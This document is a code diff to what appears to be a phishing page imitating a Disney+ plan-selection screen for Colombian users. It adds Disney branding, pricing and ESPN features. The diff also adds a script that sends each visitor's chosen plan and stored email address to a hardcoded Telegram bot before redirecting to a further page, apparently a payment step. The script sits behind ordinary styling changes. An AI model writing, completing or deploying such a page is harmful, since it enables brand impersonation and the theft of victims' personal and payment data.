@@ -13,6 +13,9 @@ body {
     font-family: 'Inter', sans-serif;
     background: #0d0d0f;
     color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
 }
 
 /* HEADER */
@@ -37,6 +40,7 @@ body {
 .content {
     padding: 20px;
     text-align: center;
+    flex: 1;
 }
 
 .step {
@@ -55,6 +59,9 @@ h1 {
     font-size: 16px;
     color: #ccc;
     margin-bottom: 30px;
+    max-width: 800px;
+    margin-left: auto;
+    margin-right: auto;
 }
 
 /* PLANES */
@@ -63,6 +70,7 @@ h1 {
     justify-content: center;
     gap: 20px;
     flex-wrap: wrap;
+    margin-bottom: 40px;
 }
 
 .plan {
@@ -71,6 +79,14 @@ h1 {
     padding: 18px;
     width: 280px;
     text-align: center;
+    border: 2px solid transparent;
+    transition: all 0.3s ease;
+    cursor: pointer;
+}
+
+.plan:hover {
+    border-color: #00a8ff;
+    transform: translateY(-5px);
 }
 
 .plan h3 {
@@ -88,6 +104,7 @@ h1 {
     font-size: 14px;
     color: #cccccc;
     margin-bottom: 20px;
+    line-height: 1.4;
 }
 
 button {
@@ -100,10 +117,166 @@ button {
     border-radius: 6px;
     font-size: 16px;
     cursor: pointer;
+    transition: background 0.3s;
 }
 
 button:hover {
     background: #e4e4e4;
+}
+
+/* FOOTER */
+.footer-section {
+    background: #0d0d0f;
+    padding: 40px 20px;
+    border-top: 1px solid #222;
+}
+
+.espn-section {
+    text-align: center;
+    padding: 20px;
+    background: #141416;
+    border-radius: 12px;
+    margin-top: 20px;
+}
+
+.espn-title {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 15px;
+    color: #00a8ff;
+}
+
+.espn-features {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 20px;
+    margin-top: 20px;
+}
+
+.feature {
+    background: #1b1b1d;
+    padding: 15px;
+    border-radius: 8px;
+    width: 200px;
+    text-align: center;
+}
+
+.feature h4 {
+    margin: 0 0 10px 0;
+    color: #00a8ff;
+    font-size: 16px;
+}
+
+.feature p {
+    font-size: 14px;
+    color: #ccc;
+    margin: 0;
+    line-height: 1.4;
+}
+
+/* COMPARISON SECTION */
+.comparison-section {
+    margin-top: 40px;
+    padding: 20px;
+    background: #141416;
+    border-radius: 12px;
+}
+
+.comparison-title {
+    text-align: center;
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: #00a8ff;
+}
+
+.comparison-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 15px;
+}
+
+.comparison-item {
+    background: #1b1b1d;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.comparison-item span {
+    display: block;
+    margin: 5px 0;
+}
+
+.check {
+    color: #00ff88;
+    font-weight: 600;
+}
+
+.cross {
+    color: #ff4444;
+    font-weight: 600;
+}
+
+/* FOOTER LINKS */
+.footer-links {
+    text-align: center;
+    padding: 30px 20px;
+    color: #888;
+    font-size: 14px;
+}
+
+.footer-links a {
+    color: #00a8ff;
+    text-decoration: none;
+    margin: 0 10px;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+}
+
+.disclaimer {
+    font-size: 12px;
+    color: #666;
+    margin-top: 20px;
+    line-height: 1.4;
+}
+
+/* LOADING */
+.loading {
+    display: none;
+    text-align: center;
+    margin-top: 15px;
+}
+
+.spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #00a8ff;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* RESPONSIVE */
+@media (max-width: 768px) {
+    .plans {
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    .plan {
+        width: 100%;
+        max-width: 300px;
+    }
 }
 </style>
 </head>
@@ -126,23 +299,23 @@ button:hover {
     <div class="plans">
 
         <!-- PREMIUM -->
-        <div class="plan">
+        <div class="plan" onclick="selectPlan('premium')">
             <h3>Premium</h3>
             <p class="price">COP 49.900/mes</p>
-            <p class="small">(precio final)<br>o COP 418.900/año</p>
+            <p class="small">(precio final)<br>o COP 418.900/año<br>30% de ahorro**</p>
             <button onclick="selectPlan('premium')">Seleccionar</button>
         </div>
 
         <!-- ESTÁNDAR -->
-        <div class="plan">
+        <div class="plan" onclick="selectPlan('standard')">
             <h3>Estándar</h3>
             <p class="price">COP 36.900/mes</p>
-            <p class="small">(precio final)<br>o COP 309.900/año</p>
+            <p class="small">(precio final)<br>o COP 309.900/año<br>30% de ahorro**</p>
             <button onclick="selectPlan('standard')">Seleccionar</button>
         </div>
 
         <!-- ESTÁNDAR CON ANUNCIOS -->
-        <div class="plan">
+        <div class="plan" onclick="selectPlan('standard_ads')">
             <h3>Estándar con anuncios</h3>
             <p class="price">COP 24.900/mes</p>
             <p class="small">(precio final)</p>
@@ -150,39 +323,178 @@ button:hover {
         </div>
 
     </div>
+
+    <!-- LOADING -->
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <p style="color:#ccc; margin-top:10px;">Procesando selección...</p>
+    </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer-section">
+    
+    <!-- ESPN SECTION -->
+    <div class="espn-section">
+        <div class="espn-title">Deportes de ESPN</div>
+        
+        <div class="espn-features">
+            <div class="feature">
+                <h4>ESPN incluido</h4>
+                <p>Disponible solo en el plan Premium</p>
+            </div>
+            
+            <div class="feature">
+                <h4>Canales ESPN</h4>
+                <p>ESPN, ESPN2, ESPN3 y más</p>
+            </div>
+            
+            <div class="feature">
+                <h4>Torneos exclusivos</h4>
+                <p>Liga Colombiana, Champions League y más</p>
+            </div>
+            
+            <div class="feature">
+                <h4>Eventos en vivo</h4>
+                <p>500+ eventos exclusivos por mes</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- COMPARISON SECTION -->
+    <div class="comparison-section">
+        <div class="comparison-title">Comparación de planes</div>
+        
+        <div class="comparison-grid">
+            <div class="comparison-item">
+                <h4>Premium</h4>
+                <span class="check">✓ 4 dispositivos simultáneos</span>
+                <span class="check">✓ 4K UHD + HDR</span>
+                <span class="check">✓ Sin anuncios</span>
+                <span class="check">✓ Descargas ilimitadas</span>
+                <span class="check">✓ ESPN incluido</span>
+            </div>
+            
+            <div class="comparison-item">
+                <h4>Estándar</h4>
+                <span class="check">✓ 2 dispositivos simultáneos</span>
+                <span class="check">✓ Full HD</span>
+                <span class="check">✓ Sin anuncios</span>
+                <span class="check">✓ Descargas limitadas</span>
+                <span class="cross">✗ ESPN no incluido</span>
+            </div>
+            
+            <div class="comparison-item">
+                <h4>Estándar con anuncios</h4>
+                <span class="check">✓ 2 dispositivos simultáneos</span>
+                <span class="check">✓ HD</span>
+                <span class="cross">✗ Con anuncios</span>
+                <span class="cross">✗ Sin descargas</span>
+                <span class="cross">✗ ESPN no incluido</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER LINKS -->
+    <div class="footer-links">
+        <a href="#">Términos de uso</a>
+        <a href="#">Política de privacidad</a>
+        <a href="#">Ayuda</a>
+        <a href="#">Dispositivos compatibles</a>
+        
+        <p class="disclaimer">
+            *La cancelación será efectiva al final del período de facturación actual.<br>
+            **Comparado con el precio mensual por 12 meses.<br>
+            © 2025 Disney y sus entidades relacionadas. Todos los derechos reservados.
+        </p>
+    </div>
 </div>
 
 <script>
-function selectPlan(code) {
+// Función para enviar plan a Telegram
+async function enviarPlanATelegram(planNombre, precio, resumen) {
+    const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
+    const chatId = "7776240161";
+    
+    // Obtener email del localStorage
+    const emailUsuario = localStorage.getItem('disneyEmail') || 'No registrado';
+    
+    const mensaje = `📋 NUEVA SELECCIÓN DE PLAN DISNEY+
+✅ Plan seleccionado: ${planNombre}
+💰 Precio: COP ${precio}/mes
+📧 Email del usuario: ${emailUsuario}
+📝 Resumen: ${resumen}
+🕐 Fecha: ${new Date().toLocaleString()}
+🌐 Página: Elegir Plan`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje
+            })
+        });
+        console.log('Plan enviado a Telegram exitosamente');
+        return true;
+    } catch (error) {
+        console.error('Error enviando a Telegram:', error);
+        return false;
+    }
+}
 
+async function selectPlan(code) {
+    // Mostrar loading
+    document.getElementById('loading').style.display = 'block';
+    
     const plans = {
-
         premium: {
             name: "Premium",
             price: "49.900",
-            summary: "4 dispositivos • 4K UHD • Sin anuncios • Descargas ilimitadas"
+            summary: "4 dispositivos • 4K UHD • Sin anuncios • Descargas ilimitadas • ESPN incluido"
         },
-
         standard: {
             name: "Estándar",
             price: "36.900",
-            summary: "2 dispositivos • Full HD • Sin anuncios"
+            summary: "2 dispositivos • Full HD • Sin anuncios • Descargas limitadas"
         },
-
         standard_ads: {
             name: "Estándar con anuncios",
             price: "24.900",
-            summary: "2 dispositivos • HD • Con anuncios"
+            summary: "2 dispositivos • HD • Con anuncios • Sin descargas"
         }
     };
 
+    const planSeleccionado = plans[code];
+    
+    // Enviar a Telegram
+    const enviado = await enviarPlanATelegram(
+        planSeleccionado.name,
+        planSeleccionado.price,
+        planSeleccionado.summary
+    );
+    
+    // Guardar en localStorage
     localStorage.setItem("plan", code);
-    localStorage.setItem("planName", plans[code].name);
-    localStorage.setItem("planPrice", plans[code].price);
-    localStorage.setItem("planSummary", plans[code].summary);
-
+    localStorage.setItem("planName", planSeleccionado.name);
+    localStorage.setItem("planPrice", planSeleccionado.price);
+    localStorage.setItem("planSummary", planSeleccionado.summary);
+    
+    // Ocultar loading
+    document.getElementById('loading').style.display = 'none';
+    
+    // Redirigir
     window.location.href = "tc.html";
 }
+
+// Cargar email si existe
+window.addEventListener('DOMContentLoaded', function() {
+    const email = localStorage.getItem('disneyEmail');
+    if (email) {
+        console.log('Usuario registrado:', email);
+    }
+});
 </script>
 
 </body>
